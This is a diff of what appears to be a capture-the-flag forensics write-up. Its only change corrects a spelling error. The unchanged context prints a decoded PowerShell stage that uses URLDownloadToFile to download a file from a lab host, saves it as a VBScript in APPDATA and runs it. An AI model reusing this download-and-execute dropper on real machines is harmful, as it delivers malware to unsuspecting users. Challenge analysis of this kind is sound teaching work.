@@ -38,7 +38,7 @@ Taking the `PowErShEll` script portion, we can decode the base64:
 $ea6c8mrT                                 =                                 Add-Type                                 -meMBerDefinITIon                                 '[DllImport("uRLmON.dlL",                                 CharSet = CharSet.Unicode)]public static extern IntPtr URLDownloadToFile(IntPtr                                 PG,string                                 Cfmr,string                                 aUvyVBRD,uint                                 ffYlDol,IntPtr                                 oFXrIh);'                                 -nAME                                 "SuxtPIBJxl"                                 -NamEsPAcE                                 nIYp                                 -PassThru;                                 $ea6c8mrT::URLDownloadToFile(0,"http://wanted.alive.htb/35/wanted.tIF","$eNv:APPDATA\wanted.vbs",0,0);STARt-sleeP(3);stARt                                 "$enV:APPDATA\wanted.vbs"
 ```
 
-We have a url: `http://wanted.alive.htb/35/wanted.tIF`, downloading that from remote it contains alot of code but some more Visual Basic of interest:
+We have a url: `http://wanted.alive.htb/35/wanted.tIF`, downloading that from remote it contains a lot of code but some more Visual Basic of interest:
 ```vb
 private function ReadStdIn()
     while Not stdIn.AtEndOfStream
